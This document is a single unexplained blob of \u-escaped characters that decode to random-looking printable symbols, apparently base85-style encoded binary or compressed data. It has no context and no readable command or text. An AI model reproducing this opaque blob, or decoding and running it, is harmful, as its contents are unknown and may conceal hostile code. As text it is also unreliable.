\u0077\u003d\u0034\u006c\u002e\u007c\u0073\u006b\u0021\u005d\u0076\u006f\u003b\u0045\u004d\u0056\u0073\u0030\u002f\u0068\u0024\u006a\u004b\u0031\u004b\u0077\u0056\u0023\u006c\u006f\u007e\u0067\u0072\u0026\u0059\u0045\u0063\u0029\u0033\u0065\u003e\u0070\u0040\u0049\u0060\u0048\u003c\u004b\u0076\u004d\u0063\u0041\u0076\u002f\u0062\u0060\u002e\u0039\u0073\u0077\u0040\u007d\u003e\u0023\u005a\u0036\u0031\u0037\u0058\u0056\u0073\u0045\u0071\u0038\u003f\u003b\u005b\u0037\u0039\u002b\u0039\u0073\u006e\u0030\u003b\u004b\u004a\u005b\u003f\u0024\u0056\u0073\u0047\u007b\u0074\u0048\u002b\u0031\u0026\u0070\u0074\u0051\u007b\u0056\u0060\u007d\u003a\u0054\u0068\u003b\u003e\u0079\u007a\u007a\u004b\u0079\u0037\u002e\u0060\u0064\u006e\u0039\u003b\u007d\u004d\u0056\u0073\u0040\u004f\u0053\u004a\u006d\u007c\u002e\u0061\u007a\u0076\u0061\u0022\u0023\u005d\u005f\u0072\u003b\u0029\u0046\u0065\u0076\u0029\u0050\u0066\u0054\u006e\u0073\u002a\u0074\u0056\u0021\u0064\u0047\u0024\u0061\u0075\u0035\u003e\u0066\u0026\u0045\u0040\u0050\u003a\u006b\u007e\u006b\u004c\u0029\u0063\u006d\u0034\u002b\u0056\u0069\u004d\u003e\u0069\u007a\u0052\u007c\u0034\u002f\u0052\u0050\u0069\u004c\u007c\u002b\u0031\u0065\u006f\u004f\u0056\u0052\u0036\u0050\u0053\u0029\u006e\u0045\u006d\u0036\u002c\u0026\u0073\u0041\u002e\u0073\u0022\u003b\u0047\u0067\u004f\u0066\u002a\u0044\u0060\u0034\u006b\u0078\u0057\u0037\u005e\u0060\u0056\u0047\u0044\u006e\u0023\u003e\u004c\u0072\u0040\u006e\u0033\u004a\u0044\u0069\u007a\u0070\u0025\u006f\u0044\u0079\u006b\u007c\u0058\u006f\u0045\u0040\u007a\u0029\u0034\u0078\u0069\u006b\u0022\u0035\u0057\u0045\u003d\u0038\u0034\u002b\u0044\u0036\u0063\u0063\u0065\u006f\u0056\u0035\u0032\u005b\u0078\u0034\u002b\u005b\u0075\u006a\u0045\u0039\u0061\u0070\u0042\u006b\u005b\u0052\u0022\u0039\u0066\u003b\u0051\u0062\u002a\u0067\u0070\u004e\u0062\u0032\u003c\u004f\u0021\u0024\u0055\u0035\u0045\u0078\u003e\u006f\u003b\u002f\u0061\u007e\u0035\u0079\u0037\u0078\u0045\u006c\u002f\u0033\u004f\u004c\u0047\u0060\u0041\u0023\u0045\u003f\u007c\u0075\u0038\u006a\u0070\u0045\u0072\u0075\u0023\u0045\u007c\u0062\u0051\u0044\u0044\u0033\u005d\u003f\u0075\u006a\u0045\u0063\u0037\u007b\u002c\u0058\u005d\u0070\u0046\u006f\u003e\u0031\u0066\u0044\u0057\u0056\u0070\u006e\u0066\u0036\u0078\u0079\u0036\u0071\u0059\u0065\u003e\u0079\u003a\u0052\u007d\u006d\u0069\u003b\u0063\u0057\u0058\u006f\u004d\u0070\u0026\u0077\u0062\u006e\u0056\u0063\u0077\u0075\u005a\u0045\u0059\u005f\u0042\u0075\u0036\u0023\u0039\u006a\u0079\u006e\u002f\u0060\u005e\u0053\u0066\u0066\u0076\u0070\u0051\u0062\u006d\u006d\u004c\u005b\u007b\u003f\u002a\u0071\u004a\u0035\u0026\u0037\u0057\u0045\u0041\u0047\u004b\u006e\u0058\u002c\u007c\u0045\u005b\u0066\u0028\u004c\u0040\u004a\u0035\u0026\u0037\u0057\u0045\u0040\u0048\u0041\u0039\u0066\u003b\u0051\u003e\u0060\u0033\u004b\u005b\u0024\u0078\u0057\u0039\u0067\u003a\u0051\u006e\u0021\u0036\u0024\u0029\u005a\u007b\u0037\u0069\u0055\u004c\u0068\u0063\u0079\u0066\u006f\u0032\u003e\u0074\u0076\u0023\u0079\u0064\u004d\u0060\u0041\u004a\u0045\u0031\u007b\u0030\u005d\u0037\u002b\u0055\u005d\u0056\u0070\u003d\u0079\u0055\u0055\u003b\u0029\u0050\u0057\u0058\u007a\u005a\u0024\u006e\u004a\u006b\u0055\u0075\u005a\u0045\u0058\u0033\u005e\u0032\u0035\u0045\u0071\u0063\u0021\u0045\u0061\u0049\u007c\u0065\u0059\u006a\u0056\u003a\u002b\u0049\u0029\u0078\u0045\u002e\u006b\u005b\u003f\u006f\u0048\u0051\u0061\u0063\u0028\u006b\u0079\u0066\u0046\u006f\u0022\u0065\u0079\u0058\u0078\u0039\u007c\u004c\u0022\u0063\u0028\u004f\u0060\u006e\u0060\u004d\u0076\u003e\u0068\u004e\u0069\u0078\u004d\u004b\u0029\u0032\u0023\u006b\u004d\u0021\u004a\u0045\u0064\u0054\u0076\u007e\u006f\u0068\u0063\u0037\u0032\u0074\u006a\u0079\u005e\u007d\u0070\u0048\u002b\u0032\u0051\u003b\u0040\u0070\u005a\u0076\u0040\u0031\u006b\u0031\u007a\u0055\u007d\u0040\u0031\u006b\u0065\u004f\u0069\u0045\u0037\u0073\u0075\u0021\u003f\u0026\u0030\u0058\u003e\u004f\u0041\u006f\u0023\u003e\u0068\u0055\u004e\u0044\u0075\u0058\u007e\u0045\u004d\u002c\u0073\u0024\u0050\u0078\u004b\u004d\u0062\u002a\u005a\u0045\u0036\u005e\u0075\u0051\u0021\u004d\u0034\u0047\u006f\u006d\u0030\u007d\u0069\u0056\u0070\u0042\u007b\u003c\u0054\u0060\u007b\u005b\u0056\u007d\u0035\u004d\u0072\u0030\u002a\u0045\u002b\u004d\u0021\u0040\u0047\u002b\u004e\u0046\u004b\u0026\u007b\u006c\u0051\u004a\u0040\u0032\u002b\u0043\u005e\u006f\u0067\u004c\u0033\u004f\u0044\u006b\u0046\u0066\u0078\u0045\u0035\u0044\u004b\u007a\u006b\u0070\u0063\u0057\u0058\u004a\u0045\u004c\u0068\u005f\u0024\u006c\u0079\u0067\u0042\u0044\u0022\u0063\u002b\u0072\u0079\u0063\u0076\u0075\u0065\u0069\u0056\u0070\u0042\u007b\u003c\u0064\u006f\u003f\u006f\u004f\u0032\u007c\u0044\u0037\u004f\u004c\u0045\u005b\u0056\u007d\u0035\u004d\u0072\u0036\u006e\u005a\u0054\u004c\u0022\u0060\u003a\u0035\u0028\u007a\u0063\u0046\u0066\u007e\u0045\u0061\u005e\u0065\u0077\u003b\u006e\u0026\u007b\u0030\u0058\u005d\u005e\u0050\u0045\u0034\u0053\u007e\u0069\u0056\u0070\u0042\u007b\u003c\u0068\u0039\u0041\u004d\u0065\u003b\u0023\u006e\u0049\u0074\u0050\u006f\u0055\u0034\u005a\u0049\u005a\u005b\u0060\u002e\u0036\u003f\u003f\u0076\u006e\u0040\u0042\u0078\u0059\u0051\u005a\u005b\u0030\u004b\u006e\u0041\u007c\u007a\u0032\u0058\u0071\u0022\u004c\u007d\u0033\u002c\u0076\u0022\u0057\u002c\u0021\u0057\u0038\u0039\u0071\u0047\u006e\u007b\u0023\u006c\u0036\u0060\u0053\u005f\u0046\u0033\u004f\u006a\u0035\u0041\u0066\u0078\u0045\u0056\u004d\u007d\u005b\u0046\u0032\u0046\u0057\u0035\u0045\u0032\u0046\u0055\u0045\u0049\u005b\u0035\u0079\u005d\u0069\u0028\u006b\u002b\u0028\u0047\u0029\u007a\u0040\u003b\u0042\u0028\u0023\u004d\u006e\u004d\u005b\u006a\u0054\u007e\u006c\u005b\u0060\u0035\u0045\u0072\u0046\u0055\u0045\u0037\u0028\u0033\u004f\u005e\u006b\u0071\u0041\u0072\u0070\u0067\u0048\u006d\u005d\u0043\u007a\u0040\u0049\u006b\u0052\u0058\u003d\u0041\u0067\u0048\u003d\u0063\u006f\u007e\u0042\u0044\u0064\u004d\u0021\u0075\u0069\u005f\u0053\u0068\u0021\u0046\u0049\u0023\u0069\u0068\u0055\u0032\u0063\u0079\u0066\u0049\u007e\u0045\u0055\u0021\u0033\u007d\u0040\u0031\u006b\u0065\u004f\u004b\u0031\u003a\u005f\u005f\u0043\u0023\u006e\u0078\u0053\u0047\u0065\u006e\u003f\u007d\u0035\u0050\u004f\u0054\u0032\u0058\u0053\u0069\u0060\u006c\u0044\u0028\u0022\u002c\u0034\u0039\u005e\u0032\u0068\u0063\u006c\u004f\u0061\u0076\u003d\u002c\u0078\u005f\u002a\u0044\u005d\u0047\u0048\u0047\u0069\u0064\u0034\u006d\u0031\u006b\u0063\u0033\u0064\u006f\u004b\u0050\u0059\u0053\u006f\u0045\u0046\u0062\u003b\u0022\u0048\u002b\u003e\u004f\u0036\u006e\u0061\u0077\u004a\u0047\u002b\u0032\u0046\u006a\u0045\u006e\u0069\u0056\u0070\u0042\u007b\u003c\u0026\u0045\u0079\u005d\u003b\u003c\u0040\u005e\u0051\u003c\u004a\u004e\u004b\u0058\u0064\u006f\u0051\u0068\u002a\u003f\u006a\u0056\u005b\u003d\u005e\u006d\u0047\u0025\u004c\u006e\u0056\u0056\u0073\u0051\u0022\u0023\u0072\u004b\u0061\u0064\u004d\u0032\u0046\u0077\u0031\u0030\u0064\u007e\u0060\u0042\u005e\u004c\u0072\u0063\u006d\u0079\u006b\u0065\u004f\u007d\u0075\u0021\u0024\u0042\u003a\u006e\u007a\u007e\u0048\u006e\u003f\u0030\u0022\u004a\u0047\u002b\u0032\u0046\u006e\u0053\u0022\u0048\u0057\u0060\u0079\u0045\u0049\u0074\u0040\u006b\u006b\u0028\u0079\u0037\u005f\u0031\u007a\u0057\u004b\u0060\u006f\u0070\u0064\u0055\u002c\u0078\u004c\u0036\u0063\u0065\u004f\u002f\u006e\u0061\u004d\u0047\u0060\u007a\u007a\u0025\u0051\u0077\u0056\u007a\u0063\u005d\u0075\u0062\u0053\u004c\u0057\u0037\u005a\u006e\u005b\u0025\u0062\u0046\u004d\u0063\u0076\u0069\u0079\u0037\u007d\u0045\u0039\u0054\u006a\u0021\u0044\u0038\u004f\u006a\u0079\u006e\u0047\u0058\u005a\u0070\u0054\u0070\u0070\u0062\u0059\u0060\u006f\u006a\u0046\u0054\u0069\u0068\u0064\u0029\u0057\u007e\u0053\u0037\u004f\u0062\u0053\u006d\u005f\u006e\u003a\u0062\u0041\u004f\u006a\u0049\u0036\u0021\u004d\u0023\u0028\u004a\u0045\u0073\u0054\u007c\u0054\u006f\u005d\u0046\u0058\u003e\u0075\u0054\u003c\u002f\u0040\u0076\u0069\u007a\u004a\u0029\u007a\u002a\u0047\u0040\u006c\u004d\u0063\u0065\u0055\u0045\u004a\u0056\u004d\u005e\u0054\u0068\u0063\u0072\u0041\u0076\u006e\u0042\u002a\u006a\u0069\u0056\u0070\u0042\u007b\u003c\u0021\u0045\u004f\u0039\u0079\u0026\u002f\u0063\u0033\u006a\u0056\u0047\u002b\u0037\u004f\u002e\u0044\u007e\u004a\u0063\u0065\u0063\u0075\u0030\u0031\u0061\u003b\u0063\u0038\u0066\u0074\u0045\u0044\u0063\u006b\u0057\u0023\u0040\u0049\u006b\u0047\u0065\u0021\u0045\u0076\u0037\u0028\u003d\u0034\u0036\u003a\u0077\u0073\u0029\u007e\u004c\u002c\u0044\u0040\u006d\u005d\u0031\u007d\u0066\u0068\u0042\u0055\u0065\u0049\u0058\u006e\u005d\u0031\u0031\u0066\u0068\u0023\u005b\u0034\u0042\u002f\u0033\u0045\u0029\u006f\u004f\u003f\u005f\u007a\u007a\u0079\u0077\u0045\u005f\u003c\u002e\u0038\u007b\u0073\u0021\u0078\u0060\u0022\u004a\u0063\u0023\u0026\u004e\u002f\u003c\u0031\u0075\u0060\u0055\u0026\u0052\u0055\u0069\u007a\u003b\u006a\u004b\u003e\u0076\u005e\u005a\u0066\u0037\u002b\u0055\u006f\u003c\u007d\u0060\u0072\u0077\u0026\u0076\u004b\u004c\u0053\u0055\u004b\u006f\u003c\u007d\u0060\u0028\u0032\u0026\u007d\u006e\u0075\u0033\u007e\u0031\u003a\u0051\u0073\u0026\u004c\u0044\u005d\u005e\u007e\u0061\u0028\u0057\u0053\u0074\u0035\u0065\u0056\u003f\u006c\u0063\u0050\u0025\u0049\u0042\u0055\u0067\u0030\u0065\u0021\u0032\u005b\u0070\u006e\u0031\u0075\u0075\u0055\u0026\u003a\u0024\u004e\u0058\u0078\u0052\u0028\u0070\u006e\u0032\u0074\u0075\u004b\u003e\u003a\u005e\u002a\u004e\u007e\u0053\u0074\u0057\u006c\u006a\u0051\u006d\u004e\u007e\u0046\u0075\u002a\u0044\u0079\u003f\u0061\u002e\u0055\u0057\u003d\u004e\u007e\u0045\u0075\u002a\u0044\u0079\u003f\u0056\u002c\u005d\u0066\u0057\u006e\u0037\u0060\u006f\u005a\u0065\u0029\u0036\u0028\u002b\u0039\u005e\u0022\u0052\u005b\u003f\u004f\u002e\u004c\u004a\u0024\u0070\u0043\u005e\u004b\u0052\u005a\u007c\u0079\u0040\u004e\u0067\u003a\u005e\u0072\u0078\u005b\u003f\u0055\u0036\u0069\u0051\u002b\u0047\u0056\u0046\u0068\u0043\u005e\u0049\u006a\u0050\u007c\u006a\u0078\u0051\u0036\u0070\u0037\u0070\u0071\u007a\u0026\u005f\u0058\u0066\u0056\u0075\u002c\u002f\u0064\u0039\u0050\u004e\u0079\u0058\u0030\u0037\u0079\u002c\u003a\u0024\u0071\u0040\u0043\u0031\u0057\u0051\u0049\u0067\u0043\u0069\u0067\u0041\u0074\u0041\u0054\u0074\u0029\u0073\u0036\u0050\u0054\u0021\u0067\u007b\u005e\u004a\u0067\u0031\u0044\u0036\u0034\u0077\u0076\u0062\u003b\u0065\u005d\u005e\u005e\u005a\u0066\u003a\u005f\u0029\u0050\u006c\u006d\u006e\u005f\u0039\u0040\u0024\u0056\u005f\u0028\u0072\u002c\u003f\u003c\u0072\u0043\u003b\u0068\u007c\u0070\u0055\u0041\u0074\u0041\u0021\u0035\u0045\u0070\u0073\u003f\u0025\u0036\u0069\u0049\u0062\u0074\u0069\u0045\u0046\u0024\u004e\u0029\u002a\u0023\u0026\u0025\u0058\u0022\u006d\u0073\u0076\u0057\u0046\u0077\u0036\u002c\u004e\u005b\u004b\u0039\u0035\u0075\u0045\u0041\u0063\u0060\u0058\u006e\u0065\u003e\u002b\u0053\u0038\u0044\u0070\u006a\u0025\u006b\u0064\u004b\u002f\u0055\u0057\u002a\u005b\u004b\u007b\u0037\u0026\u004b\u0047\u0026\u0075\u0053\u0040\u0047\u0033\u003b\u0066\u0077\u007d\u0033\u0045\u006d\u002a\u0038\u003a\u004a\u0045\u006d\u004c\u0046\u0036\u0052\u0062\u004f\u0045\u0061\u0070\u0036\u007d\u003a\u0062\u002b\u007e\u007d\u003c\u0042\u0047\u0076\u0024\u0067\u0045\u0066\u0063\u002a\u0025\u0071\u0043\u005b\u007e\u0025\u0065\u0074\u005e\u0025\u004f\u0022\u0075\u006a\u0035\u0045\u0069\u005d\u0076\u006f\u003b\u0070\u0037\u0029\u0073\u0042\u0046\u0069\u0037\u0021\u003c\u0045\u004d\u0068\u004f\u0047\u0076\u0037\u0065\u0048\u0034\u0038\u0031\u0041\u0059\u0068\u0052\u0059\u0038\u0076\u0021\u003c\u0050\u0054\u0068\u005d\u007d\u007c\u0073\u0045\u0035\u0076\u0057\u0062\u004d\u0072\u0032\u0060\u0042\u0050\u0047\u005f\u0068\u0061\u0033\u0042\u0046\u004c\u0026\u0042\u0071\u0053\u0038\u006c\u0063\u0070\u0023\u003c\u0075\u005d\u0064\u005f\u005d\u006f\u006c\u004f\u0039\u0049\u0023\u003d\u0034\u0021\u005f\u0040\u006a\u005f\u0060\u0046\u005b\u003c\u0061\u0057\u0064\u0059\u006d\u0057\u006d\u0024\u0034\u0030\u0070\u0021\u004a\u006f\u0023\u0077\u005f\u0053\u0069\u0033\u0055\u0034\u004a\u0072\u0032\u004b\u0069\u0053\u004a\u006f\u0038\u002a\u0072\u0047\u0075\u004a\u0039\u0036\u0037\u006e\u002b\u0036\u006c\u0069\u0076\u0025\u0068\u0053\u0037\u0041\u0069\u0045\u007c\u002a\u005f\u0047\u0021\u004c\u004f\u0077\u007b\u007d\u0036\u006a\u0063\u0047\u0073\u0072\u0034\u0023\u006e\u002b\u0035\u006c\u004e\u006c\u0031\u0035\u0062\u0077\u002c\u0056\u0063\u0072\u003b\u0043\u006d\u003f\u0073\u002e\u005f\u0065\u0069\u005b\u006f\u0026\u0049\u0023\u0031\u005f\u003c\u0030\u006c\u003e\u0037\u003f\u0040\u0054\u006e\u0077\u0072\u004e\u006b\u0057\u0055\u0021\u0022\u0059\u007b\u0023\u0079\u0049\u0040\u0045\u0077\u0025\u0062\u007e\u006e\u006c\u0073\u0025\u0075\u0031\u0039\u004c\u0044\u0074\u0048\u006f\u0051\u0065\u002e\u0030\u0051\u0052\u006a\u0029\u0026\u006e\u007c\u0079\u0032\u004e\u002b\u002f\u004f\u003c\u0069\u0056\u007c\u005e\u0049\u0028\u002a\u007e\u0042\u0034\u0032\u004f\u003c\u0069\u0056\u007c\u005e\u0074\u0049\u0042\u004d\u0054\u0074\u005e\u0072\u0073\u002c\u0066\u0025\u007a\u0056\u004b\u0032\u002a\u0054\u0077\u0069\u0056\u0056\u005e\u0074\u0049\u0071\u0079\u0043\u0039\u0070\u0062\u005d\u0056\u005d\u0070\u0058\u0049\u0024\u0068\u0030\u0040\u006f\u0079\u0044\u006b\u0037\u0048\u0051\u0036\u0042\u003e\u0067\u005a\u003e\u0058\u0066\u0069\u0047\u0032\u006f\u0026\u0042\u0042\u006c\u0048\u0057\u0062\u0024\u005e\u0070\u0023\u006f\u0043\u003e\u0029\u0042\u0059\u0025\u003d\u003f\u0053\u002f\u0025\u0065\u0070\u0049\u007a\u0048\u0063\u007d\u003e\u0076\u0057\u0045\u0042\u007d\u0030\u0038\u002c\u0074\u005a\u0021\u0031\u0036\u0023\u0071\u0022\u004c\u0062\u002f\u002e\u003a\u006e\u004d\u0037\u007c\u007c\u0041\u0029\u0054\u0047\u0039\u0042\u0074\u0040\u006d\u006f\u002c\u002c\u002f\u005d\u006c\u0031\u0058\u002c\u004c\u0042\u006a\u004f\u007d\u0024\u004d\u006e\u0051\u0062\u0054\u0072\u002b\u002b\u004d\u007a\u002e\u0039\u0064\u0029\u0038\u005a\u0061\u005e\u0060\u0060\u0070\u0074\u0032\u0065\u005f\u007a\u0061\u0033\u0045\u0030\u0047\u0071\u006e\u005a\u0021\u0031\u0058\u006e\u004f\u0062\u003b\u0072\u0037\u0024\u003a\u0037\u0075\u0035\u0074\u004e\u006f\u0042\u002e\u004d\u0059\u007d\u0043\u0040\u006c\u0065\u003e\u003c\u004f\u0047\u0039\u0037\u005a\u0042\u0035\u0026\u004b\u006c\u0067\u0059\u0070\u0078\u004f\u006f\u0062\u0039\u0063\u0023\u0032\u0061\u003a\u0049\u006a\u0073\u0034\u004f\u0029\u0026\u0050\u0066\u0032\u0065\u003b\u0031\u0045\u0058\u0049\u002a\u0023\u0037\u0039\u0068\u0054\u0069\u003e\u0052\u0040\u0049\u0032\u006f\u0054\u0032\u0037\u0069\u007b\u0075\u0021\u0051\u0067\u004f\u0038\u0035\u005a\u0037\u0069\u0067\u006f\u0037\u005e\u0060\u0050\u0042\u004f\u0048\u005b\u005e\u006f\u004e\u003c\u0037\u0079\u0041\u0042\u005e\u0051\u006b\u002a\u0064\u0026\u0069\u0052\u0042\u0074\u0034\u004f\u0058\u0038\u0035\u005a\u0037\u0061\u0038\u0052\u0029\u007a\u0050\u004f\u0070\u004f\u007c\u006b\u0069\u0030\u006c\u005b\u0062\u0065\u0078\u0048\u0056\u0026\u004b\u007d\u0072\u0071\u0023\u0048\u0038\u005e\u0036\u0022\u0040\u0037\u0052\u0073\u0039\u0071\u0041\u002e\u0031\u0025\u007c\u0056\u003a\u0045\u0037\u0074\u0062\u004f\u0048\u0071\u004a\u0046\u006b\u0069\u0066\u0034\u0044\u0024\u004d\u0061\u0064\u0046\u0029\u005e\u0039\u0069\u006f\u0052\u0044\u006c\u002e\u0047\u0065\u0059\u0037\u0026\u0056\u0074\u0079\u002c\u0031\u002e\u0028\u0050\u0021\u0035\u0069\u0043\u007e\u0034\u0058\u0073\u004c\u0058\u0048\u0033\u007c\u0074\u0042\u005f\u0034\u0066\u0050\u0054\u0029\u003b\u005a\u007c\u0078\u0064\u004f\u0054\u0037\u0063\u006b\u002a\u003b\u006b\u0069\u0070\u0063\u0047\u003c\u0036\u0060\u007a\u0048\u0025\u007c\u0057\u0045\u0064\u0037\u005a\u003f\u002f\u0066\u0025\u0029\u0044\u0061\u004a\u0044\u0072\u0046\u0044\u0053\u002e\u002f\u004f\u003c\u0037\u0061\u003f\u004f\u005d\u002a\u0032\u006b\u0069\u0024\u0065\u004f\u0049\u0050\u0028\u0052\u0074\u0069\u0057\u0026\u003b\u003c\u0070\u0058\u006f\u0063\u004e\u0033\u0071\u0063\u0033\u0062\u0053\u0077\u0035\u0036\u0076\u0024\u007c\u0059\u0023\u004a\u0073\u004e\u0040\u0024\u0075\u0059\u004b\u003e\u0031\u004e\u0066\u004c\u0068\u0035\u0031\u006d\u0070\u0059\u004b\u007c\u005e\u006f\u004c\u003e\u0029\u0067\u0047\u006f\u004f\u0047\u0034\u006b\u007d\u004c\u0076\u0024\u007c\u0059\u0073\u0060\u0073\u004e\u0021\u0074\u007a\u0055\u007e\u005b\u0073\u0062\u0053\u0078\u0024\u0067\u0052\u0048\u007c\u0050\u0077\u007d\u0069\u0076\u004e\u0023\u0048\u0056\u0055\u0026\u002b\u004c\u0049\u0042\u0073\u0039\u003c\u0074\u002f\u0043\u007a\u0047\u005e\u0062\u006e\u007c\u0065\u0032\u0067\u0061\u0051\u007a\u0068\u0078\u0041\u004e\u006f\u0044\u006f\u005a\u0024\u0054\u0077\u003f\u0040\u0076\u004e\u0037\u006d\u006e\u005e\u002c\u004d\u0065\u0076\u0066\u005b\u0040\u004d\u006c\u004e\u004d\u0062\u004b\u0040\u0051\u0077\u0067\u007c\u0037\u005e\u0060\u0070\u004b\u0021\u006b\u0021\u0043\u0041\u0022\u0079\u006e\u0040\u0049\u0025\u0042\u006a\u003e\u0047\u0023\u0073\u0032\u002e\u0068\u003c\u004f\u005e\u005b\u0058\u0060\u002a\u0024\u005d\u002e\u006d\u003d\u006a\u0039\u007a\u0075\u0067\u0021\u006b\u0021\u0043\u0041\u0022\u0079\u006e\u0048\u0051\u0048\u0028\u0024\u0052\u005f\u007c\u0028\u002a\u006d\u003d\u0061\u004e\u006e\u0078\u0068\u0021\u007c\u0025\u0030\u0079\u0035\u0031\u005d\u002e\u0059\u004b\u0067\u004e\u003c\u0023\u0021\u006b\u0021\u0043\u0041\u0022\u0079\u006e\u006b\u0051\u0075\u0052\u0038\u0053\u007c\u004c\u006e\u006a\u0033\u0062\u007a\u006f\u0030\u0069\u0021\u006a\u0052\u0065\u002e\u003a\u006e\u0037\u004e\u003d\u0025\u004b\u006f\u0044\u0031\u0062\u0059\u005b\u003e\u006e\u004e\u003a\u003a\u0023\u0021\u006b\u0021\u0043\u0041\u0022\u0079\u006e\u0079\u007a\u004b\u003d\u003e\u0067\u002c\u0031\u0062\u0059\u0071\u005b\u0021\u006a\u0072\u004a\u007b\u0032\u003b\u0062\u0059\u0040\u004d\u007b\u004e\u003b\u0033\u006b\u0075\u007a\u0043\u0070\u007d\u0070\u006f\u0049\u0069\u004c\u004e\u0052\u0035\u0039\u0021\u006b\u0021\u0043\u0041\u0022\u0079\u006e\u0025\u0062\u0026\u0049\u0069\u0072\u0024\u0029\u0059\u003d\u003c\u0023\u0071\u004e\u0079\u0028\u002f\u0045\u004c\u003a\u0034\u0059\u0072\u003a\u0061\u004e\u007a\u0040\u0048\u007c\u002b\u006a\u003c\u002a\u0071\u0037\u0025\u0049\u0046\u003e\u005e\u0057\u005a\u0051\u0061\u0026\u0046\u004d\u0062\u0036\u0059\u0059\u004b\u005a\u004e\u004c\u0056\u0071\u004d\u003c\u0060\u0053\u004d\u0044\u004e\u003b\u003b\u0051\u002e\u0071\u0046\u007d\u004d\u0022\u0070\u007d\u0032\u0031\u0054\u0077\u0059\u003d\u006c\u004e\u0061\u0067\u0056\u005f\u004c\u0040\u0042\u0076\u0048\u0074\u0057\u0070\u0036\u005e\u002e\u003b\u004e\u0064\u0059\u0050\u0073\u0025\u0024\u004a\u0042\u007d\u0058\u006b\u0068\u004a\u0049\u0057\u0068\u003b\u0035\u0061\u0073\u005d\u005e\u0074\u0060\u0044\u0057\u0063\u003b\u004e\u002c\u0036\u005d\u0077\u0070\u0036\u005e\u002e\u003b\u004e\u0068\u0025\u005b\u0032\u0046\u0069\u0052\u0059\u0043\u003d\u005d\u0071\u0058\u0052\u0049\u0057\u0068\u003b\u0073\u007b\u0073\u005d\u003b\u0023\u0024\u0051\u0053\u0073\u0048\u0036\u0077\u0058\u003b\u0029\u003f\u005d\u0069\u004f\u0065\u0072\u003a\u0076\u0047\u0061\u0067\u004f\u0078\u0073\u0062\u0075\u0066\u0028\u006e\u0023\u0033\u0041\u0023\u0056\u0036\u0036\u0052\u003c\u0079\u0023\u0074\u002b\u0022\u005d\u005d\u0031\u0057\u0077\u0058\u0055\u0044\u0049\u005d\u0060\u0061\u0060\u0049\u005a\u0053\u0044\u0026\u003f\u005d\u0075\u0039\u006b\u0070\u0026\u0042\u004e\u0044\u0079\u0058\u0052\u0068\u0038\u0025\u004f\u0061\u0042\u003e\u005f\u003e\u006e\u0022\u0065\u0072\u0056\u0044\u004f\u0025\u0029\u007c\u0035\u0073\u0048\u0033\u0074\u0075\u003d\u0025\u0071\u0023\u0063\u004c\u0057\u007e\u0033\u005e\u0029\u0064\u007a\u002c\u0030\u002e\u0041\u0075\u005d\u005d\u003e\u005f\u003e\u006e\u0022\u0065\u0072\u0056\u0046\u0079\u0029\u0046\u006e\u0048\u0074\u0058\u0078\u006f\u0068\u007a\u004c\u005e\u0029\u003c\u005d\u0035\u0055\u0028\u002b\u0074\u003e\u0068\u0076\u003d\u004c\u0076\u0070\u0036\u007e\u0033\u003b\u004e\u0052\u005d\u0055\u0070\u003e\u003e\u005f\u003e\u006e\u0022\u0065\u0072\u0056\u005f\u0079\u0051\u0062\u002e\u004a\u0042\u0023\u0043\u0071\u0054\u003e\u0064\u0061\u007c\u0079\u003d\u0075\u0075\u0032\u0056\u0038\u005d\u002f\u004b\u0021\u0067\u002a\u0045\u0036\u0042\u003b\u0053\u002c\u0056\u005d\u003c\u0033\u006c\u002e\u0030\u003e\u005f\u003e\u006e\u0022\u0065\u0072\u0056\u0072\u0023\u003c\u005b\u0079\u0024\u002c\u0056\u0040\u0036\u0042\u003b\u002f\u0053\u003e\u0064\u004d\u0058\u0064\u0048\u007c\u0042\u003b\u0044\u0026\u006b\u005d\u0048\u002e\u0030\u002e\u0043\u004f\u0054\u0067\u005d\u0024\u003e\u005f\u003e\u006e\u0022\u0065\u0072\u0056\u0076\u0042\u0047\u0044\u0077\u0068\u0054\u0039\u0057\u0069\u003b\u0029\u0075\u0035\u002f\u005d\u003b\u0067\u0032\u0021\u003b\u0039\u0032\u003c\u005d\u0023\u0060\u0073\u0059\u006d\u004c\u002f\u0038\u0076\u004f\u006a\u002c\u0025\u0042\u0026\u0042\u002a\u003b\u003b\u004e\u0031\u005d\u003e\u0046\u004a\u006e\u0045\u002f\u0026\u0075\u007b\u007d\u0026\u0045\u005d\u007c\u007c\u0079\u0033\u003d\u0023\u0059\u0039\u004c\u003f\u006d\u0045\u0065\u0046\u003e\u0049\u006a\u006c\u0075\u004e\u0023\u006b\u0064\u0038\u0054\u0029\u004e\u0069\u0040\u006c\u0028\u0024\u0025\u004d\u0061\u004c\u0021\u0024\u003d\u006c\u0046\u003f\u007c\u003e\u0052\u0064\u004f\u002a\u0036\u0034\u0024\u0078\u006c\u004d\u005d\u0074\u0054\u0034\u0024\u0048\u006c\u003d\u0030\u0073\u0056\u0070\u002e\u007c\u0026\u0024\u0049\u0031\u0074\u003f\u002f\u0059\u0021\u0066\u0061\u0026\u0024\u0038\u002e\u0046\u004f\u004d\u005e\u0044\u0029\u002c\u002b\u0050\u005f\u0059\u0038\u0074\u0062\u002c\u0024\u0063\u0057\u0049\u007c\u004d\u0030\u0022\u005d\u0062\u005e\u006f\u0073\u006e\u002f\u0059\u004e\u003c\u0023\u0034\u004a\u0065\u005e\u0071\u005e\u0053\u0063\u004d\u0050\u002b\u0064\u0044\u006d\u0039\u006a\u0044\u0073\u002c\u0074\u0036\u007e\u0059\u0064\u004b\u0034\u0062\u004d\u0052\u003c\u0046\u0053\u006d\u0077\u0051\u0059\u0045\u0068\u0037\u005f\u005e\u0044\u006b\u002e\u003b\u0063\u004d\u0075\u0044\u0045\u0076\u0036\u0044\u003b\u003a\u003a\u0060\u004d\u0028\u0032\u0039\u0079\u0031\u0041\u007d\u0052\u004a\u003f\u0034\u0059\u0024\u0034\u0028\u0047\u007d\u0072\u003c\u0052\u0048\u0065\u0045\u006e\u004d\u0021\u003d\u0073\u002b\u0024\u006f\u0054\u0047\u006f\u0044\u0079\u0053\u005d\u0021\u0040\u003a\u006d\u0023\u0042\u0065\u0066\u003a\u0025\u0021\u003e\u0059\u0037\u0063\u0057\u0025\u0063\u004d\u006d\u0058\u0055\u004d\u0055\u005b\u0028\u0044\u0046\u0053\u007a\u0051\u0049\u0059\u004a\u0056\u0071\u0053\u003a\u0041\u002a\u002e\u0077\u0068\u0077\u005e\u005d\u0078\u0078\u002a\u0049\u003f\u007c\u0029\u0061\u006a\u0059\u007a\u006a\u0052\u005e\u0061\u003f\u0072\u0059\u0030\u004a\u0053\u0053\u007e\u007b\u006e\u007d\u0040\u005f\u0059\u004c\u005a\u0075\u0058\u0051\u0047\u0057\u004a\u0075\u0034\u0049